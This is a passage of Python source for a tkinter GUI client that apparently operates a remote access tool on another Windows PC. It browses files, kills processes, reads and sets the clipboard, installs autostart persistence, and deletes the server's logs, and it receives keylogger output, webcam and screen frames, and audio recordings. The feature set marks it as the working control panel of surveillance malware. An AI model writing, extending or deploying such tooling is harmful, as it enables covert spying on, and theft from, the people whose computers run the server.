        self.proc_tree.column("pid", width=70)
        self.proc_tree.column("name", width=200)
        self.proc_tree.column("cpu", width=60)
        self.proc_tree.column("mem", width=60)
        self.proc_tree.column("status", width=80)
        self.proc_tree.pack(fill="both", expand=True, padx=10, pady=4)

    def _on_proc_refresh(self):
        if not self._check_conn(): return
        threading.Thread(target=self._do_proc_refresh, daemon=True).start()

    def _do_proc_refresh(self):
        procs = self.dev.process_list()
        for i in self.proc_tree.get_children():
            self.proc_tree.delete(i)
        for p in procs[:100]:
            self.proc_tree.insert("", "end", values=(
                p.get("pid", ""), p.get("name", ""),
                f"{p.get('cpu', 0):.1f}", f"{p.get('mem', 0):.1f}",
                p.get("status", ""),
            ))

    def _on_proc_kill(self):
        if not self._check_conn(): return
        target = self.kill_e.get().strip()
        if not target: return
        threading.Thread(target=self._do_proc_kill, args=(target,), daemon=True).start()

    def _do_proc_kill(self, target):
        if target.isdigit():
            r = self.dev.process_kill(pid=int(target))
        else:
            r = self.dev.process_kill(name=target)
        self.root.after(0, lambda: messagebox.showinfo("Kill", r.get("message", "?")))

    def _build_sys_fs(self, tab):
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=10, pady=6)
        mlabel(ctrl, "Path:").pack(side="left", padx=2)
        self.fs_path_e = ttk.Entry(ctrl, width=50)
        self.fs_path_e.insert(0, "C:\\")
        self.fs_path_e.pack(side="left", padx=4)
        mbtn(ctrl, "Browse", self._on_fs_browse).pack(side="left", padx=4)

        cols = ("name", "type", "size")
        self.fs_tree = ttk.Treeview(tab, columns=cols, show="headings", height=20)
        self.fs_tree.heading("name", text="Name")
        self.fs_tree.heading("type", text="Type")
        self.fs_tree.heading("size", text="Size")
        self.fs_tree.column("name", width=350)
        self.fs_tree.column("type", width=60)
        self.fs_tree.column("size", width=100)
        self.fs_tree.pack(fill="both", expand=True, padx=10, pady=4)
        self.fs_tree.bind("<Double-1>", self._on_fs_dblclick)

    def _on_fs_browse(self):
        if not self._check_conn(): return
        path = self.fs_path_e.get().strip() or "."
        threading.Thread(target=self._do_fs_browse, args=(path,), daemon=True).start()

    def _do_fs_browse(self, path):
        result = self.dev.fs_list(path)
        if "error" in result:
            self.root.after(0, lambda: messagebox.showerror("Error", result["error"]))
            return
        self.fs_path_e.delete(0, "end")
        self.fs_path_e.insert(0, result.get("path", path))
        for i in self.fs_tree.get_children():
            self.fs_tree.delete(i)
        for e in result.get("entries", []):
            sz = e.get("size", 0)
            if sz > 1024*1024:
                sz_s = f"{sz/(1024*1024):.1f} MB"
            elif sz > 1024:
                sz_s = f"{sz/1024:.1f} KB"
            else:
                sz_s = f"{sz} B"
            self.fs_tree.insert("", "end", values=(
                e.get("name", ""), "DIR" if e.get("is_dir") else "FILE", sz_s
            ))

    def _on_fs_dblclick(self, event):
        sel = self.fs_tree.selection()
        if not sel: return
        item = self.fs_tree.item(sel[0])
        name = item["values"][0]
        is_dir = item["values"][1] == "DIR"
        if is_dir:
            current = self.fs_path_e.get().strip()
            if current and not current.endswith("\\"):
                current += "\\"
            self.fs_path_e.delete(0, "end")
            self.fs_path_e.insert(0, current + name)
            self._on_fs_browse()

    def _build_sys_clip(self, tab):
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=10, pady=6)
        mbtn(ctrl, "Get Clipboard", self._on_clip_get).pack(side="left", padx=4)
        mlabel(ctrl, "Set:").pack(side="left", padx=(8, 2))
        self.clip_e = ttk.Entry(ctrl, width=40)
        self.clip_e.pack(side="left", padx=2)
        mbtn(ctrl, "Set Clipboard", self._on_clip_set).pack(side="left", padx=4)
        self.clip_box = mbox(tab, height=20)
        self.clip_box.pack(fill="both", expand=True, padx=10, pady=4)

    def _on_clip_get(self):
        if not self._check_conn(): return
        threading.Thread(target=self._do_clip_get, daemon=True).start()

    def _do_clip_get(self):
        r = self.dev.clipboard_get()
        if r.get("success"):
            txt = r.get("text", "")
            self.root.after(0, lambda: (mclear(self.clip_box), mappend(self.clip_box, txt)))
        else:
            self.root.after(0, lambda: mappend(self.clip_box, "Error: " + r.get("text", "")))

    def _on_clip_set(self):
        if not self._check_conn(): return
        text = self.clip_e.get().strip()
        if not text: return
        threading.Thread(target=self._do_clip_set, args=(text,), daemon=True).start()

    def _do_clip_set(self, text):
        r = self.dev.clipboard_set(text)
        ok = r.get("success", False)
        self.root.after(0, lambda: mappend(self.clip_box, f"{'OK' if ok else 'FAIL'}: {r.get('text', '')}\n"))

    def _build_sys_manage(self, tab):
        mlabel(tab, "Autostart:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
        af = tk.Frame(tab, bg=C_SURFACE)
        af.pack(fill="x", padx=15, pady=4)
        mbtn(af, "Install", self._on_install_auto).pack(side="left", padx=4)
        mbtn(af, "Remove", self._on_remove_auto).pack(side="left", padx=4)
        self.auto_st = mlabel(af, "[not installed]", fg=C_FG_DIM)
        self.auto_st.pack(side="left", padx=10)

        mlabel(tab, "Server Control:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
        sc = tk.Frame(tab, bg=C_SURFACE)
        sc.pack(fill="x", padx=15, pady=4)
        mbtn(sc, "Restart Server", self._on_restart).pack(side="left", padx=4)
        mbtn(sc, "Heartbeat", self._on_heartbeat).pack(side="left", padx=4)

        mlabel(tab, "Server Logs:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
        log_btns = tk.Frame(tab, bg=C_SURFACE)
        log_btns.pack(fill="x", padx=15, pady=4)
        mbtn(log_btns, "View Logs", self._on_view_logs).pack(side="left", padx=4)
        mbtn(log_btns, "Download Logs", self._on_download_logs).pack(side="left", padx=4)
        mbtn(log_btns, "Delete Logs", self._on_delete_logs).pack(side="left", padx=4)
        self.log_status = mlabel(log_btns, "", fg=C_FG_DIM)
        self.log_status.pack(side="left", padx=10)

        mlabel(tab, "Danger Zone:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(12, 4))
        dz = tk.Frame(tab, bg=C_SURFACE)
        dz.pack(fill="x", padx=15, pady=4)
        mbtn(dz, "UNINSTALL Server", self._on_uninstall).pack(side="left", padx=4)

        self.upd_log = mbox(tab, height=8)
        self.upd_log.pack(fill="x", padx=15, pady=6)

    def _on_heartbeat(self):
        if not self._check_conn(): return
        threading.Thread(target=self._do_heartbeat, daemon=True).start()

    def _do_heartbeat(self):
        info = self.dev.heartbeat()
        if info:
            lines = ["=== Heartbeat ==="]
            for k, v in info.items():
                if k == "ip":
                    continue
                lines.append(f"  {k}: {v}")
            self.root.after(0, lambda: (mclear(self.upd_log), mappend(self.upd_log, "\n".join(lines))))
        else:
            self.root.after(0, lambda: mappend(self.upd_log, "No response\n"))

    def _on_uninstall(self):
        if not self._check_conn(): return
        if not messagebox.askyesno("DANGER", "This will completely remove the server from the remote PC. Continue?"):
            return
        threading.Thread(target=self._do_uninstall, daemon=True).start()

    def _do_uninstall(self):
        r = self.dev.uninstall()
        msg = r.get("message", "Unknown") if r else "No response"
        self.root.after(0, lambda: messagebox.showinfo("Uninstall", msg))

    def _log_sys(self, msg):
        if hasattr(self, "upd_log"):
            mappend(self.upd_log, "[" + time.strftime("%H:%M:%S") + "] " + msg)

    def _on_install_auto(self):
        if not self._check_conn(): return
        threading.Thread(target=self._do_install_auto, daemon=True).start()

    def _do_install_auto(self):
        r = self.dev.install_autostart(secret=self.dev.secret)
        if r and r.get("success"):
            self.root.after(0, lambda: self.auto_st.configure(text="[Installed]", fg=C_GREEN))
            self._log_sys("[Autostart] " + r.get("message", "") + "\n")
        else:
            self.root.after(0, lambda: self.auto_st.configure(text="[Failed]", fg=C_RED))
            self._log_sys("[Autostart] Failed: " + str(r) + "\n")

    def _on_remove_auto(self):
        if not self._check_conn(): return
        threading.Thread(target=self._do_remove_auto, daemon=True).start()

    def _do_remove_auto(self):
        r = self.dev.remove_autostart()
        if r and r.get("success"):
            self.root.after(0, lambda: self.auto_st.configure(text="[Removed]", fg=C_FG_DIM))
        else:
            self._log_sys("[Autostart rm] Failed\n")
            self.root.after(0, lambda: self.auto_st.configure(text="[Failed]", fg=C_RED))

    def _on_restart(self):
        if not self._check_conn(): return
        if not messagebox.askyesno("Confirm", "Restart " + self.dev.name + "?\nServer will restart and you'll need to reconnect."): return
        self.dev.restart_server()
        self._status("Restarting...", C_ORANGE)
        self._shell_is_active = False
        self.stream_active = False
        self.screen_active = False
        self.dev.connected = False
        self.dev.running = False
        self.root.after(3000, self._try_reconnect_after_restart)

    def _try_reconnect_after_restart(self):
        if not self.dev:
            return
        self.dev.close_ws()
        while not self.dev.msg_queue.empty():
            try:
                self.dev.msg_queue.get_nowait()
            except queue.Empty:
                break
        if self.dev.loop and not self.dev.loop.is_closed():
            try:
                self.dev.loop.call_soon_threadsafe(self.dev.loop.stop)
            except Exception:
                pass
        self.dev.connect_async()
        self._status("Reconnecting...", C_ORANGE)
        threading.Thread(target=self._wait_conn, daemon=True).start()

    # Log management
    def _on_view_logs(self):
        if not self._check_conn(): return
        threading.Thread(target=self._do_view_logs, daemon=True).start()

    def _do_view_logs(self):
        r = self.dev.log_view()
        if r and r.get("exists"):
            self.root.after(0, lambda: self._show_log_view_dialog(r.get("lines", ""), r.get("total_lines", 0)))
        else:
            self.root.after(0, lambda: self.log_status.configure(text="No logs", fg=C_RED))

    def _show_log_view_dialog(self, log_text, total_lines):
        win = tk.Toplevel(self.root)
        win.title("Server Logs ({} lines)".format(total_lines))
        win.geometry("800x600")
        win.configure(bg=C_SURFACE)
        win.transient(self.root)
        text_widget = mbox(win, height=30)
        text_widget.pack(fill="both", expand=True, padx=10, pady=10)
        mclear(text_widget)
        mappend(text_widget, log_text)
        text_widget.configure(state="disabled")
        close_btn = mbtn(win, "Close", win.destroy)
        close_btn.pack(pady=(0, 10))

    def _on_download_logs(self):
        if not self._check_conn(): return
        save_dir = filedialog.askdirectory(title="Save logs to directory")
        if not save_dir: return
        self.log_status.configure(text="Downloading...", fg=C_ORANGE)
        threading.Thread(target=self._do_download_logs, args=(save_dir,), daemon=True).start()

    def _do_download_logs(self, save_dir):
        ok, msg = self.dev.log_download(save_dir)
        if ok:
            self.root.after(0, lambda: self.log_status.configure(text="Downloaded: " + os.path.basename(msg.split(": ", 1)[-1]) if ": " in msg else msg, fg=C_GREEN))
        else:
            self.root.after(0, lambda: self.log_status.configure(text="Failed: " + msg, fg=C_RED))

    def _on_delete_logs(self):
        if not self._check_conn(): return
        if not messagebox.askyesno("Confirm", "Delete server logs?"): return
        r = self.dev.log_delete()
        if r and r.get("success"):
            self.log_status.configure(text="Logs deleted", fg=C_GREEN)
        else:
            self.log_status.configure(text="Failed to delete logs", fg=C_RED)

    # ──── queue poll ────
    def _poll(self):
        for d in self.devices.values():
            if not d.connected:
                continue
            try:
                while True:
                    msg = d.msg_queue.get_nowait()
                    t = msg["type"]
                    if t == "disconnected":
                        d.connected = False
                        d.running = False
                        self._shell_is_active = False
                        self.stream_active = False
                        self.screen_active = False
                        self._status(d.name + " offline", C_RED)
                        if hasattr(self, "shell_st"):
                            self.shell_st.configure(text="[Offline]", fg=C_RED)
                    elif t == "stream_frame":
                        b64 = msg["data"].get("frame_b64", "")
                        if b64 and self.stream_active:
                            self.root.after(0, lambda b=b64: self._display_cam_frame(b))
                    elif t == "screen_frame":
                        b64 = msg["data"].get("frame_b64", "")
                        fw = msg["data"].get("width", 800)
                        fh = msg["data"].get("height", 600)
                        if b64 and self.screen_active:
                            self.root.after(0, lambda b=b64, ww=fw, hh=fh: self._display_screen_frame(b, ww, hh))
                    elif t == "keylog_data":
                        txt = msg["data"].get("data", "")
                        if txt:
                            ts = time.strftime("%H:%M:%S")
                            self.root.after(0, lambda t=txt, s=ts: mappend(self.kl_out, "[" + s + "] " + t + "\n"))
                    elif t == "audio_status":
                        st = msg["data"].get("status", "")
                        ms = msg["data"].get("message", "")
                        self.root.after(0, lambda s=st, m=ms: self.audio_status.configure(text=s + " " + m, fg=C_GREEN))
                    elif t == "audio_list":
                        recs = msg["data"].get("recordings", [])
                        self.root.after(0, lambda r=recs: self._refresh_alist(r))
                    elif t == "update_status":
                        pass
            except queue.Empty:
                pass

        self.root.after(60, self._poll)

    def _refresh_alist(self, recs):
        self.audio_listbox.delete(0, "end")
        if not recs:
            self.audio_listbox.insert("end", "(no recordings)")
            return
        for r in recs:
            self.audio_listbox.insert("end", r["name"] + "   (" + str(r["size"] // 1024) + " KB)")

    def run(self):
        self._monitoring_ping = True
        self.root.mainloop()
        self._monitoring_ping = False


def main():
    app = App()
    app.run()


if __name__ == "__main__":
    main()
